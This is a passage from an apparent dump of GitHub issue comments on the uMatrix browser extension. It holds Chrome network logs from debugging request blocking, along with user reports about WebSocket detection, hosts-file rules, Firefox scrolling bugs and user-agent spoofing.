-URL_REQUEST_DELEGATE\nt=  9 [st=  9]      HTTP_CACHE_GET_BACKEND  [dt=0]\nt=  9 [st=  9]      HTTP_CACHE_OPEN_ENTRY  [dt=4]\n                    --> net_error = -2 (ERR_FAILED)\nt= 13 [st= 13]      HTTP_CACHE_CREATE_ENTRY  [dt=3]\nt= 16 [st= 16]      HTTP_CACHE_ADD_TO_ENTRY  [dt=0]\nt= 16 [st= 16]     +HTTP_STREAM_REQUEST  [dt=104]\nt= 16 [st= 16]        HTTP_STREAM_JOB_CONTROLLER_BOUND\n                      --> source_dependency = 1726 (HTTP_STREAM_JOB_CONTROLLER)\nt=120 [st=120]        HTTP_STREAM_REQUEST_BOUND_TO_JOB\n                      --> source_dependency = 1727 (HTTP_STREAM_JOB)\nt=120 [st=120]     -HTTP_STREAM_REQUEST\nt=120 [st=120]     +HTTP_TRANSACTION_SEND_REQUEST  [dt=1]\nt=120 [st=120]        HTTP_TRANSACTION_SEND_REQUEST_HEADERS\n                      --> GET /assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png HTTP/1.1\n                          Host: cloud.githubusercontent.com\n                          Connection: keep-alive\n                          Upgrade-Insecure-Requests: 1\n                          User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3081.0 Safari/537.36\n                          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n                          Accept-Encoding: gzip, deflate, br\n                          Accept-Language: en-US,en;q=0.8\nt=121 [st=121]     -HTTP_TRANSACTION_SEND_REQUEST\nt=121 [st=121]     +HTTP_TRANSACTION_READ_HEADERS  [dt=28]\nt=121 [st=121]        HTTP_STREAM_PARSER_READ_HEADERS  [dt=28]\nt=149 [st=149]        HTTP_TRANSACTION_READ_RESPONSE_HEADERS\n                      --> HTTP/1.1 200 OK\n                          Cache-Control: max-age=2592000\n                          Last-Modified: Thu, 27 Apr 2017 10:11:47 GMT\n                          ETag: \"c4327bb26aa856f783346c55366dc944\"\n                          Content-Type: image/png\n                          Content-Length: 447268\n                          Accept-Ranges: bytes\n                          Date: Thu, 27 Apr 2017 11:44:43 GMT\n                          Via: 1.1 varnish\n                          Age: 5574\n                          Connection: keep-alive\n                          X-Served-By: cache-fra1229-FRA\n                          X-Cache: HIT\n                          X-Cache-Hits: 1\n                          X-Fastly-Request-ID: 002d8551c13c909e465cb66028a62efb3839411b\n                          Server: GitHub Cloud\n                          Timing-Allow-Origin: https://github.com\nt=149 [st=149]     -HTTP_TRANSACTION_READ_HEADERS\nt=149 [st=149]      HTTP_CACHE_WRITE_INFO  [dt=0]\nt=149 [st=149]      HTTP_CACHE_WRITE_DATA  [dt=0]\nt=150 [st=150]      HTTP_CACHE_WRITE_INFO  [dt=0]\nt=150 [st=150]     +URL_REQUEST_DELEGATE  [dt=3]\nt=150 [st=150]        DELEGATE_INFO  [dt=3]\n                      --> delegate_blocked_by = \"extension uMatrix\"\nt=153 [st=153]        CHROME_EXTENSION_MODIFIED_HEADERS\n                      --> extension_id = \"biklejmhpofaebhjdgijbmjhcplnfjec\"\nt=153 [st=153]     -URL_REQUEST_DELEGATE\nt=153 [st=153]   -URL_REQUEST_START_JOB\nt=153 [st=153]   +URL_REQUEST_DELEGATE  [dt=1]\nt=153 [st=153]      DELEGATE_INFO  [dt=1]\n                    --> delegate_blocked_by = \"NavigationResourceThrottle\"\nt=154 [st=154]   -URL_REQUEST_DELEGATE\nt=154 [st=154]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=154 [st=154]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=155 [st=155]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 3607\nt=155 [st=155]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=155 [st=155]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=155 [st=155]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 6940\nt=155 [st=155]    HTTP_TRANSACTION_READ_BODY  [dt=18]\nt=173 [st=173]    HTTP_CACHE_WRITE_DATA  [dt=5]\nt=178 [st=178]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 21732\nt=178 [st=178]    HTTP_TRANSACTION_READ_BODY  [dt=18]\nt=196 [st=196]    HTTP_CACHE_WRITE_DATA  [dt=6]\nt=202 [st=202]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=202 [st=202]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=202 [st=202]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=203 [st=203]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=203 [st=203]    HTTP_TRANSACTION_READ_BODY  [dt=12]\nt=215 [st=215]    HTTP_CACHE_WRITE_DATA  [dt=4]\nt=219 [st=219]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=219 [st=219]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=220 [st=220]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=220 [st=220]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=220 [st=220]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=221 [st=221]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=222 [st=222]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=222 [st=222]    HTTP_TRANSACTION_READ_BODY  [dt=6]\nt=228 [st=228]    HTTP_CACHE_WRITE_DATA  [dt=2]\nt=230 [st=230]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=231 [st=231]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=231 [st=231]    HTTP_CACHE_WRITE_DATA  [dt=5]\nt=236 [st=236]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=236 [st=236]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=237 [st=237]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=238 [st=238]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=238 [st=238]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=239 [st=239]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=239 [st=239]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=239 [st=239]    HTTP_TRANSACTION_READ_BODY  [dt=3]\nt=242 [st=242]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=243 [st=243]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=243 [st=243]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=244 [st=244]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=244 [st=244]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=244 [st=244]    HTTP_TRANSACTION_READ_BODY  [dt=16]\nt=260 [st=260]    HTTP_CACHE_WRITE_DATA  [dt=6]\nt=266 [st=266]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=266 [st=266]    HTTP_TRANSACTION_READ_BODY  [dt=11]\nt=277 [st=277]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=278 [st=278]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=278 [st=278]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=279 [st=279]    HTTP_CACHE_WRITE_DATA  [dt=4]\nt=283 [st=283]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=284 [st=284]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=285 [st=285]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=285 [st=285]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=286 [st=286]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=286 [st=286]    HTTP_CACHE_WRITE_DATA  [dt=6]\nt=292 [st=292]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=292 [st=292]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=293 [st=293]    HTTP_CACHE_WRITE_DATA  [dt=4]\nt=297 [st=297]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=297 [st=297]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=298 [st=298]    HTTP_CACHE_WRITE_DATA  [dt=3]\nt=301 [st=301]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=301 [st=301]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=302 [st=302]    HTTP_CACHE_WRITE_DATA  [dt=2]\nt=304 [st=304]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 21773\nt=304 [st=304]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=304 [st=304]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=305 [st=305] -REQUEST_ALIVE\n\n\n. I mean, it does --> delegate_blocked_by = \"extension uMatrix\" and the later goes and fetches it anyway? that bastard! :))) chromium i mean =)  (ok, i probably missing something here hehe). @Atavic I would try to block it via uBlock Origin, but it doesn't do this kind of blocking, apparently. \n(with an empty Whitelist and My rules being only * * * block and enabled I am an advanced user)\nRequest for the image isn't blocked:\n\n\n3589: URL_REQUEST\nhttps://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\nStart Time: 2017-04-27 20:19:12.960\nt=  0 [st=  0] +REQUEST_ALIVE  [dt=305]\n                --> priority = \"HIGHEST\"\n                --> url = \"https://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\"\nt=  0 [st=  0]    DELEGATE_INFO  [dt=2]\n                  --> delegate_blocked_by = \"NavigationResourceThrottle\"\nt=  2 [st=  2]   +URL_REQUEST_DELEGATE  [dt=7]\nt=  2 [st=  2]      DELEGATE_INFO  [dt=7]\n                    --> delegate_blocked_by = \"extension uBlock Origin\"\nt=  9 [st=  9]   -URL_REQUEST_DELEGATE\nt=  9 [st=  9]    URL_REQUEST_START_JOB  [dt=0]\n                  --> load_flags = 37120 (MAIN_FRAME_DEPRECATED | MAYBE_USER_GESTURE | VERIFY_EV_CERT)\n                  --> method = \"GET\"\n                  --> url = \"https://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\"\nt=  9 [st=  9]   +URL_REQUEST_START_JOB  [dt=137]\n                  --> load_flags = 37120 (MAIN_FRAME_DEPRECATED | MAYBE_USER_GESTURE | VERIFY_EV_CERT)\n                  --> method = \"GET\"\n                  --> url = \"https://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\"\nt=  9 [st=  9]      URL_REQUEST_DELEGATE  [dt=0]\nt= 10 [st= 10]      HTTP_CACHE_GET_BACKEND  [dt=0]\nt= 10 [st= 10]      HTTP_CACHE_OPEN_ENTRY  [dt=0]\n                    --> net_error = -2 (ERR_FAILED)\nt= 10 [st= 10]      HTTP_CACHE_CREATE_ENTRY  [dt=0]\nt= 10 [st= 10]      HTTP_CACHE_ADD_TO_ENTRY  [dt=0]\nt= 10 [st= 10]     +HTTP_STREAM_REQUEST  [dt=105]\nt= 10 [st= 10]        HTTP_STREAM_JOB_CONTROLLER_BOUND\n                      --> source_dependency = 3592 (HTTP_STREAM_JOB_CONTROLLER)\nt=115 [st=115]        HTTP_STREAM_REQUEST_BOUND_TO_JOB\n                      --> source_dependency = 3593 (HTTP_STREAM_JOB)\nt=115 [st=115]     -HTTP_STREAM_REQUEST\nt=115 [st=115]     +HTTP_TRANSACTION_SEND_REQUEST  [dt=1]\nt=115 [st=115]        HTTP_TRANSACTION_SEND_REQUEST_HEADERS\n                      --> GET /assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png HTTP/1.1\n                          Host: cloud.githubusercontent.com\n                          Connection: keep-alive\n                          Upgrade-Insecure-Requests: 1\n                          User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3081.0 Safari/537.36\n                          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8\n                          Accept-Encoding: gzip, deflate, br\n                          Accept-Language: en-US,en;q=0.8\nt=116 [st=116]     -HTTP_TRANSACTION_SEND_REQUEST\nt=116 [st=116]     +HTTP_TRANSACTION_READ_HEADERS  [dt=25]\nt=116 [st=116]        HTTP_STREAM_PARSER_READ_HEADERS  [dt=25]\nt=141 [st=141]        HTTP_TRANSACTION_READ_RESPONSE_HEADERS\n                      --> HTTP/1.1 200 OK\n                          Cache-Control: max-age=2592000\n                          Last-Modified: Thu, 27 Apr 2017 10:11:47 GMT\n                          ETag: \"c4327bb26aa856f783346c55366dc944\"\n                          Content-Type: image/png\n                          Content-Length: 447268\n                          Accept-Ranges: bytes\n                          Date: Thu, 27 Apr 2017 18:19:30 GMT\n                          Via: 1.1 varnish\n                          Age: 29261\n                          Connection: keep-alive\n                          X-Served-By: cache-fra1240-FRA\n                          X-Cache: HIT\n                          X-Cache-Hits: 1\n                          X-Fastly-Request-ID: 3f0b37315c671bd7eeba7c81fe965ec271b988a4\n                          Server: GitHub Cloud\n                          Timing-Allow-Origin: https://github.com\nt=141 [st=141]     -HTTP_TRANSACTION_READ_HEADERS\nt=141 [st=141]      HTTP_CACHE_WRITE_INFO  [dt=1]\nt=142 [st=142]      HTTP_CACHE_WRITE_DATA  [dt=0]\nt=142 [st=142]      HTTP_CACHE_WRITE_INFO  [dt=0]\nt=142 [st=142]     +URL_REQUEST_DELEGATE  [dt=4]\nt=142 [st=142]        DELEGATE_INFO  [dt=4]\n                      --> delegate_blocked_by = \"extension uBlock Origin\"\nt=146 [st=146]        CHROME_EXTENSION_MODIFIED_HEADERS\n                      --> extension_id = \"iphimjoabppgpifmkfadpbjigcefepdp\"\nt=146 [st=146]     -URL_REQUEST_DELEGATE\nt=146 [st=146]   -URL_REQUEST_START_JOB\nt=146 [st=146]   +URL_REQUEST_DELEGATE  [dt=1]\nt=146 [st=146]      DELEGATE_INFO  [dt=1]\n                    --> delegate_blocked_by = \"NavigationResourceThrottle\"\nt=147 [st=147]   -URL_REQUEST_DELEGATE\nt=147 [st=147]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=147 [st=147]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=147 [st=147]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 2269\nt=147 [st=147]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=148 [st=148]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=148 [st=148]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 8277\nt=148 [st=148]    HTTP_TRANSACTION_READ_BODY  [dt=18]\nt=166 [st=166]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=166 [st=166]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 19143\nt=166 [st=166]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=166 [st=166]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=167 [st=167]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 2589\nt=167 [st=167]    HTTP_TRANSACTION_READ_BODY  [dt=20]\nt=187 [st=187]    HTTP_CACHE_WRITE_DATA  [dt=3]\nt=190 [st=190]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=190 [st=190]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=191 [st=191]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=191 [st=191]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=191 [st=191]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=192 [st=192]    HTTP_CACHE_WRITE_DATA  [dt=2]\nt=194 [st=194]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=194 [st=194]    HTTP_TRANSACTION_READ_BODY  [dt=14]\nt=208 [st=208]    HTTP_CACHE_WRITE_DATA  [dt=4]\nt=212 [st=212]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=212 [st=212]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=213 [st=213]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=214 [st=214]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=214 [st=214]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=214 [st=214]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=215 [st=215]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=215 [st=215]    HTTP_TRANSACTION_READ_BODY  [dt=3]\nt=218 [st=218]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=219 [st=219]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=219 [st=219]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=220 [st=220]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=220 [st=220]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=220 [st=220]    HTTP_TRANSACTION_READ_BODY  [dt=59]\nt=279 [st=279]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=280 [st=280]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 16384\nt=280 [st=280]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=281 [st=281]    HTTP_CACHE_WRITE_DATA  [dt=4]\nt=285 [st=285]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=285 [st=285]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=286 [st=286]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=286 [st=286]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=286 [st=286]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=287 [st=287]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=288 [st=288]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=288 [st=288]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=289 [st=289]    HTTP_CACHE_WRITE_DATA  [dt=4]\nt=293 [st=293]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=293 [st=293]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=294 [st=294]    HTTP_CACHE_WRITE_DATA  [dt=1]\nt=295 [st=295]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=295 [st=295]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=296 [st=296]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=296 [st=296]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=296 [st=296]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=297 [st=297]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=297 [st=297]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=297 [st=297]    HTTP_TRANSACTION_READ_BODY  [dt=1]\nt=298 [st=298]    HTTP_CACHE_WRITE_DATA  [dt=3]\nt=301 [st=301]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 32768\nt=301 [st=301]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=301 [st=301]    HTTP_CACHE_WRITE_DATA  [dt=3]\nt=305 [st=305]    URL_REQUEST_JOB_FILTERED_BYTES_READ\n                  --> byte_count = 5390\nt=305 [st=305]    HTTP_TRANSACTION_READ_BODY  [dt=0]\nt=305 [st=305]    HTTP_CACHE_WRITE_DATA  [dt=0]\nt=305 [st=305] -REQUEST_ALIVE\n\n\nbut request for the favicon is blocked:\n\n\n3599: URL_REQUEST\nhttps://cloud.githubusercontent.com/favicon.ico\nStart Time: 2017-04-27 20:19:13.326\nt=366 [st=0] +REQUEST_ALIVE  [dt=4]\n              --> priority = \"MEDIUM\"\n              --> url = \"https://cloud.githubusercontent.com/favicon.ico\"\nt=367 [st=1]   +URL_REQUEST_DELEGATE  [dt=3]\nt=367 [st=1]      DELEGATE_INFO  [dt=3]\n                  --> delegate_blocked_by = \"extension uBlock Origin\"\nt=370 [st=4]      CHROME_EXTENSION_ABORTED_REQUEST\n                  --> extension_id = \"iphimjoabppgpifmkfadpbjigcefepdp\"\nt=370 [st=4]   -URL_REQUEST_DELEGATE\nt=370 [st=4]    CANCELLED\n                --> source = \"delegate\"\nt=370 [st=4]   +URL_REQUEST_START_JOB  [dt=0]\n                --> load_flags = 33024 (MAYBE_USER_GESTURE | VERIFY_EV_CERT)\n                --> method = \"GET\"\n                --> url = \"https://cloud.githubusercontent.com/favicon.ico\"\nt=370 [st=4]   -URL_REQUEST_START_JOB\n                --> net_error = -20 (ERR_BLOCKED_BY_CLIENT)\nt=370 [st=4]    URL_REQUEST_DELEGATE  [dt=0]\nt=370 [st=4] -REQUEST_ALIVE\n              --> net_error = -20 (ERR_BLOCKED_BY_CLIENT)\n\n\nAnd it's interesting to see the difference: CHROME_EXTENSION_ABORTED_REQUEST and CANCELLED appear when actual blocking is happening. So maybe delegate_blocked_by appears regardless of the blocking happening, maybe it's like a description of what's trying to check if it wants to block or not. source code\n. Roger that :). Thank you gorhill for the explanation. This seems to be the earlier report you mentioned: https://github.com/gorhill/uBlock/issues/2076#issuecomment-254194734. ",
    "rjkpa": "\nuMatrix 0.9.9b4\n\nI'm on the WebStore release version 0.9.3.6 on Chrome 58.\nTried 0.9.9.4, and same on Chrome 59 too. I guess it's on Chrome only.. > prevent to load the specific scripts that activate websocket connections.\nTechnical details do not matter. Also that's a preventive measure fyi, and uBlock Origin already has the ability, so should uMatrix too since it's network firewall so it should be able detect a websocket connection. That's the point. On top of this, beginning with Chrome 58 websocket connections are natively detected by Chrome, so it shouldn't be an issue anymore.. @gorhill Alright, 0.9.9.7 does appear to be detecting WebSocket connections on Chrome, but at All level and not on website level in the logger. Why ?\nSecondly, in All it shows \"request not processed\". Why and what does that mean ? I do have uBO running too. Here's the logger page - https://i.gyazo.com/d0dd59c6b4de27138a0bce074c9dc724.png \nTest-case is http://beta.speedtest.net/. > but at All level and not on website level in the logger. Why ?\nWould you also answer that please ? Like in uBO we can see it when logging the current website and we don't have to change it to All, so why not the same in uMatrix too ?. Any update on this ?. but the same behavior is not present in uBO's popup UI, why ?. Thank you, that does make sense for uMatrix's behavior.. ",
    "pauschuu": "popup.js:259 Uncaught TypeError: Cannot read property 'temporary' of undefined\n    at getTemporaryColor (popup.js:259)\n    at getCellAction (popup.js:405)\n    at handleFilter (popup.js:430)\n    at handleBlacklistFilter (popup.js:443)\n    at HTMLDivElement. (popup.js:1347). And sorry for creating a duplicate I just filtered by the \"bug\" label and there was nothing so I just created it. . ",
    "a90c": "@gorhill Many thanks for your hard work which changed my whole \"browsing\" experience.  . \n@TriMoon uMatrix can be installed and its properly working in yandex browser for android(based on chromium), you just have to download the opera extention version for it.(nex format not chrome's crx format in case you want to install it offline in developer mode)\nJust a note, you have to be aware that yandex browser has some tracking implimentations(appsflyer, google analytics...) so it is not recommended if your goal is privacy, but you can always make use of a well customized hosts file and some file permissions modifications ;) .. ",
    "Arkenyah": "THERE it is!  Marvelous!\n@toshiya44 Thank you for the prompt and precise redirect.\n@gorhill Thank YOU sir for doing what you do to make this blocking addon not only available and functional, but also a wonderful work of art and a great experience for internet users around the globe!  The internet is a better and safer place on account of your amazing contributions!. ",
    "Karegohan-And-Kamehameha": "I just tried turning all userstyles off, it had no effect and the bug still persists.. I think I figured it out. The issue only occurs when APZ is enabled (setting layers.async-pan-zoom.enabled is set to true).. I'm on Windows 7 64bit. I tried forcing D3D9 and OpenGL rendering, both were affected.. ",
    "nidico": "I came here to open the same feature request. I think uMatrix + multi-account containers would be a very useful match.. ",
    "xuedi": "I did upload a screenshot: http://imgur.com/QX2UWXn . ",
    "stade5000": "I too have this problem. It happens about 10-20 % of the time.\nuMatrix 0.9.3.4 & Opera 44.0.2510.1218 on Linux. ",
    "Darkspirit": "\nIPv6-host-specific rules are not saved across browser restarts\n\nnot fixed! The rule I've set is still lost over a restart. Can you reproduce this?\n\n1st-party rules are not applied. Every script is a 3rd-party script, even if it's a 1st party one.\n\nfixed in the pre-release\n. I created that bugzilla entry: The dropdown bubble is empty when extensions.webextensions.remote=true.\nBut this bug here is different.\nThis happens with extensions.webextensions.remote=false (default). That STR from the bug reporter are correct.\nIf I open a new tab with Ctrl+T, uMatrix does not have an icon. If I then type in about:newtab and press enter, uMatrix gets an icon and recognizes newtab.about-scheme.\n\nBeside those two bugs, everything is working as expected (I think).\n. ",
    "aspera7": "Thanks a lot, issue resolved. Closing.. ",
    "najjara": "How can I show that? I don't want to just take a series of screenshot. \"Behind the scene\" in logger shows that the file is requested, so does Wireshark. I've tried without other extensions and investigated, and found no cause, thus this bug report.\nHere's the Wireshark capture: uMatrix-MVPS.pcapng.gz\nIn it you can see that the first HTTP GET request gets a Bad request response (purged uMatrix, then tried to update). Then a few seconds later I went to the URL where the file resides (this time Firefox sent the HTTP request) to which the stream ends with a HTTP OK message. A few seconds after, I tried to update the host file from within uMatrix, it doesn't send an HTTP request, likely because it checks and finds the file unchanged in FF cache and just parses it (which can be confirmed by purging the cache in uMatrix w/o clearing the FF cache, then trying to update again successfully).\nIt's not a transient issue, I've been experiencing it for months, but I just did my \"workaround\" and went about my business. I've decided to report it since I couldn't find any other reports and no fix.. Yes, my browser's Accept is text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 (I use the Mozilla binaries, not my Arch package). But it shows the txt file just fine, and uMatrix updates after that without a problem. In Wireshark, I can see that uMatrix sends */*, but then gets a 400 response\nApply tcp.stream eq 0 in filters to follow the first HTTP stream uMatrix makes (that results in failure); it has Accept: */*. But see tcp.stream eq 2 (the browser, which has Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8) but ends in 200 OK. @xofe It's good that you've pointed that out. I'm running my network behind Privoxy, and the config is set to filter ETags. I can't see the issue after removing the filter. Weird that only the ASP.NET run server had issues with it.. ",
    "grinapo": "1) indeed, selecting specific version in AMO works. Thanks! (This probably should be reflected in your release links here on github, ignorant bastards like me just expect the link to install the xpi.)\n2) it was required since bot uMatrix and uBlockO magically stopped working (without any explanation or visible message whatsoever)\n3) xpinstall.signatures.required defaults to true, I haven't touched it. If this wasn't the case then the nightly yesterday activated/changed it.\n4) it's so nice that mozilla hides this info that words cannot describe it. Along with the happy riddance of NPAPI (so everything java related stopped working, which basically covers 99% of racked server management interfaces) this really provides the silver lining to the Mozilla-2017-feeling\u2122.. ",
    "JesseBilsten": "Yes. It's OS X 10.12.4. ",
    "JadeSnail": "Same here, using uMatrix 0.9.3.6.. ",
    "jungletek": "Thanks for the timely response, and sorry I wasn't already on the dev-branch; I wasn't aware of it's existence.\nEDIT: You linked to ublock-origin instead of uMatrix. I don't use the former. For anyone else seeing this, you want: https://addons.mozilla.org/en-US/firefox/addon/umatrix/versions/beta\nEDIT2: Works as expected with the beta version. Thanks again, Raymond.. ",
    "electricessence": "Duped because I couldn't comment. :/. ",
    "MarcSN311": "sorry i clicked on the wrong button, thats my uBlock Origin Version. uMatrix Version is 0.9.3.6. sorry, only searched for open issues.. ",
    "ericdand": "@gorhill Whoops, of course. I'm using Chrome version 58.0.3029.81 (64-bit), on a MacBook (from 2015, with the Retina display).. ",
    "mustaqimM": "@gorhill I'm having the same problem on Nightly 55.0a1 with the webext v1.0.0. I am unable to scroll down and sometimes the popup doesn't open and the twice, the icon was hidden.. ",
    "CollinChaffin": "@gorhill Why did you close this so quickly?  You are awfully short with your loyal users of your stuff I'm sorry but the docs aren't clear and your answer makes no sense so can you explain?  Let me re-phrase the question - when I enable ALL host files lists - I want xyz.com allowed.  EVERY visit to anything on xyz.com gives me a page saying screw you - denied.  Unlike ublock with an override - I cannot continue.  I go back and add rules - they don't work and the docs confirm HOST FILES are global and TRUMP everything.\nLet's say xyz.com is literally found in ALL the lists.\nSo again, if xyz.com is in ALL THE HOST FILE LISTS, how can I allow xyz.com without deselecting all the lists and basically turning off umatix all together or is this not possible in your app?\n. ",
    "kaliostro2": "Please. Reopened. I described in more detail. For me, this issue is a heartbleeding.. I confirm. Firefox 55 does not have this issue. Firefox 54 and below are affected.. No.Please. Don`t remove UA Spoofing. I have not seen a good addon which could be given this job.. :(. Tested all the add-ons specializing in UA Spoofing. They all have the above problem. I ask you to reconsider your decision and find a proper solution to the problem. I certainly understand that your main direction is uBlock Origin but still. Please forgive me for persistence.\n. ",
    "SamHasler": "\npartially spoofing some navigator entries does not accomplish much ...\nSee for yourself using dev console, inspect window.navigator for whichever site for which the UA spoofer seems to work. You will see other entries in there not touched by uMatrix and which contradict entries touched by uMatrix.\n\nThis is likely giving additional information with which to fingerprint users. i.e. if they see different UA for different requests they could assume \u00b5Matrix is installed.. ",
